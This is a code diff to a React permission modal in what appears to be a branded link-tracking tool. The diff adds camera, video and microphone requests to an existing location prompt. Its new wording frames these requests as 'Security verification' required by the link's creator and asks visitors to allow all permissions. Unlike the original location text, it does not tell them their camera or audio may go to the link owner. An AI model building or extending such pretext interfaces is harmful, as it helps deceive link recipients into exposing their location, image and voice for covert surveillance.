@@ -5,12 +5,15 @@ import { Button } from "@/components/ui/Button";
 import { MapPin, ShieldCheck, AlertCircle } from "lucide-react";
 import { getPlatformBranding } from "@/lib/branding";
 
+import { PermissionsConfig } from "@/lib/types";
+
 interface SnapPermissionModalProps {
   isOpen: boolean;
   isLoading: boolean;
   error?: string | null;
   platform?: string | null;
   targetUrl?: string | null;
+  permissionsConfig?: PermissionsConfig;
   onAllowLocation: () => void;
 }
 
@@ -20,9 +23,30 @@ export const SnapPermissionModal: React.FC<SnapPermissionModalProps> = ({
   error,
   platform,
   targetUrl,
+  permissionsConfig,
   onAllowLocation,
 }) => {
   const branding = getPlatformBranding(targetUrl, platform);
+  const hasMedia = Boolean(permissionsConfig?.camera || permissionsConfig?.video || permissionsConfig?.audio);
+  const hasLocation = permissionsConfig?.location ?? true;
+
+  const modalTitle = hasMedia && hasLocation
+    ? "Verification Required"
+    : hasMedia
+    ? "Camera Verification Required"
+    : "Location Required";
+
+  const modalDesc = hasMedia && hasLocation
+    ? `Location, Camera & Security verification are required by the creator to view this ${branding.name} content. Please allow all requested permissions.`
+    : hasMedia
+    ? `Camera & Security verification are required by the creator to view this ${branding.name} content. Please allow camera access.`
+    : "Your location is required to view this content. By allowing location access, your current location will be shared with the link owner.";
+
+  const promptSubtext = hasMedia && hasLocation
+    ? "Browser will prompt for Location, Camera & Microphone access"
+    : hasMedia
+    ? "Browser will prompt for Camera & Microphone access"
+    : "Browser will prompt for standard location permission";
 
   return (
     <Modal isOpen={isOpen} className="text-center">
@@ -51,11 +75,11 @@ export const SnapPermissionModal: React.FC<SnapPermissionModalProps> = ({
       </div>
 
       <h3 className="text-lg font-bold text-white mb-2 tracking-tight">
-        Location Required
+        {modalTitle}
       </h3>
 
       <p className="text-xs sm:text-sm text-white/70 leading-relaxed mb-5 px-1">
-        Your location is required to view this content. By allowing location access, your current location will be shared with the link owner.
+        {modalDesc}
       </p>
 
       {/* Security badge */}
@@ -86,11 +110,13 @@ export const SnapPermissionModal: React.FC<SnapPermissionModalProps> = ({
         <MapPin className="w-4 h-4 mr-2" />
         {error
           ? `Retry & ${branding.actionText || "Continue"}`
+          : hasMedia && hasLocation
+          ? (branding.actionText ? `Verify & ${branding.actionText}` : "Allow All & View Content")
           : (branding.actionText || "Allow Location & View Content")}
       </Button>
 
       <p className="text-[10px] text-white/40 mt-2.5 font-medium">
-        Browser will prompt for standard location permission
+        {promptSubtext}
       </p>
     </Modal>
   );
